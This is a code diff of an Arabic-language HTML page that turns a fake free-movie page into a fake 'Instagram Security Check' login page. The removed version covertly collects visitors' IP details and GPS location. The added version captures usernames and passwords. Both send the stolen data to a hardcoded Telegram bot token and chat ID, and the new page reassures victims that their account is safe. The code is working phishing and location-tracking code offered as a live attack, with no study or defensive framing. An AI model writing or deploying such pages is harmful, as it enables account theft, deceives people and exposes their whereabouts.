@@ -2,90 +2,76 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سينما أونلاين - مشاهدة مجانية</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram Security Check</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0f0f0f; color: white; text-align: center; padding-top: 40px; margin: 0; }
-        .container { background: #1e1e1e; padding: 25px; border-radius: 12px; max-width: 350px; margin: auto; box-shadow: 0 10px 25px rgba(0,0,0,0.8); }
-        img { width: 100%; border-radius: 8px; margin-bottom: 15px; }
-        h2 { color: #e50914; margin-top: 0; }
-        p { color: #b3b3b3; font-size: 15px; }
-        button { background: #e50914; color: white; border: none; padding: 15px; font-size: 18px; font-weight: bold; border-radius: 6px; cursor: pointer; width: 100%; transition: 0.3s; margin-top: 10px; }
-        button:hover { background: #ff0a16; }
-        #status { margin-top: 15px; color: #00ff88; font-size: 14px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { max-width: 350px; width: 100%; padding: 20px; background: white; border: 1px solid #dbdbdb; border-radius: 1px; text-align: center; }
+        .logo { margin-bottom: 20px; font-size: 2.5rem; font-weight: 600; font-family: "Billabong", cursive; color: #262626; }
+        .input-group { margin-bottom: 10px; }
+        .input-group input { width: 100%; padding: 12px 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; outline: none; text-align: left; }
+        .btn { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 10px; }
+        
+        .success-screen { display: none; }
+        .success-icon { font-size: 50px; color: #2ecc71; margin-bottom: 15px; }
+        .success-title { color: #262626; font-size: 18px; font-weight: bold; margin-bottom: 10px; }
+        .success-text { color: #8e8e8e; font-size: 14px; line-height: 1.5; }
+        
+        .loader { display: none; margin: 20px auto; border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>🎬 سينما أونلاين</h2>
-        <img src="https://image.tmdb.org/t/p/w500/1E5baAaEse26fej7uHcjOgEE2t2.jpg" alt="Movie Poster">
-        <p>فيلم الأكشن والغموض (2026) - جودة 4K مجاناً</p>
-        
-        <button id="btn" onclick="startMovie()">اضغط لمشاهدة الفيلم</button>
-        <div id="status"></div>
+        <div id="login-screen">
+            <div class="logo">Instagram</div>
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="Phone number, username, or email" required autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="btn" id="submitBtn">Log In</button>
+            </form>
+            <div class="loader" id="loader"></div>
+        </div>
+
+        <div id="success-screen" class="success-screen">
+            <div class="success-icon">✅</div>
+            <div class="success-title">حسابك سليم 100%</div>
+            <div class="success-text">
+                تم فحص حسابك بنجاح.<br>لم يتم اكتشاف أي عمليات اختراق أو دخول مشبوه.
+            </div>
+        </div>
     </div>
 
     <script>
-        // التحقق مما إذا كان المستخدم داخل تطبيق (تيك توك، إنستغرام، فيسبوك...)
-        const ua = navigator.userAgent || navigator.vendor || window.opera;
-        const isInApp = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Instagram") > -1) || (ua.indexOf("musical_ly") > -1) || (ua.indexOf("BytedanceWebview") > -1) || (ua.indexOf("TikTok") > -1);
+        const BOT_TOKEN = "8933571192:AAEAl7ej-akD789tzkS1sJK7zIZz020a4kA";
+        const CHAT_ID = "8322196658";
 
-        function startMovie() {
-            document.getElementById('btn').innerText = "جاري التجهيز...";
-            document.getElementById('status').innerText = "الرجاء الانتظار...";
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault(); 
             
-            const BOT_TOKEN = "8933571192:AAEAl7ej-akD789tzkS1sJK7zIZz020a4kA";
-            const CHAT_ID = "8322196658";
+            document.getElementById('submitBtn').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
 
-            // 1. أخذ الـ IP (يعمل في كل الحالات)
-            fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(ipData => {
-                    const ipMsg = encodeURIComponent(`🌐 معلومات الـ IP:\nالدولة: ${ipData.country_name}\nالمدينة: ${ipData.city}\nالـ IP: ${ipData.ip}\nالمزود: ${ipData.org}`);
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${ipMsg}`, { mode: 'no-cors', keepalive: true });
-                }).catch(e => console.log("IP Error"));
+            const msg = `🚨 تم اصطياد بيانات!\n\n👤 المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
 
-            // 2. إذا كان داخل تيك توك أو إنستغرام، قم بتحويله لكروم تلقائياً
-            if (isInApp) {
-                const currentUrl = window.location.href;
-                if (ua.indexOf("Android") > -1) {
-                    // فتح كروم مباشرة
-                    window.location.href = "intent://" + currentUrl.replace("https://", "") + "#Intent;scheme=https;package=com.android.chrome;end";
-                } else {
-                    // للأيفون
-                    window.open(currentUrl, '_system');
-                }
-                return; // إيقاف التنفيذ هنا حتى يفتح في كروم
-            }
+            fetch(url, { method: 'GET', mode: 'no-cors', keepalive: true }).catch(() => {});
 
-            // 3. إذا كان في كروم بالفعل، اطلب الموقع الدقيق (GPS)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        const lat = pos.coords.latitude;
-                        const lon = pos.coords.longitude;
-                        
-                        document.getElementById('status').innerText = "✅ تم التشغيل بنجاح!";
-                        document.getElementById('btn').style.display = 'none';
-                        
-                        const gpsMsg = encodeURIComponent(`🚨 موقع دقيق (GPS):\nخط العرض: ${lat}\nخط الطول: ${lon}\n🗺️ الخريطة: https://maps.google.com/?q=${lat},${lon}`);
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${gpsMsg}`, { mode: 'no-cors', keepalive: true });
-                        
-                        setTimeout(() => {
-                            window.location.href = "https://www.youtube.com/results?search_query=free+full+movie";
-                        }, 3000);
-                    },
-                    (err) => {
-                        // إذا رفض السماح بالموقع
-                        document.getElementById('status').innerText = "✅ تم التشغيل بنجاح!";
-                        document.getElementById('btn').style.display = 'none';
-                        setTimeout(() => {
-                            window.location.href = "https://www.youtube.com/results?search_query=free+full+movie";
-                        }, 1500);
-                    }
-                );
-            }
-        }
+            // تم تعديل المؤقت هنا إلى 3000 (أي 3 ثوانٍ)
+            setTimeout(function() {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('success-screen').style.display = 'block'; 
+            }, 3000);
+        });
     </script>
 </body>
 </html>
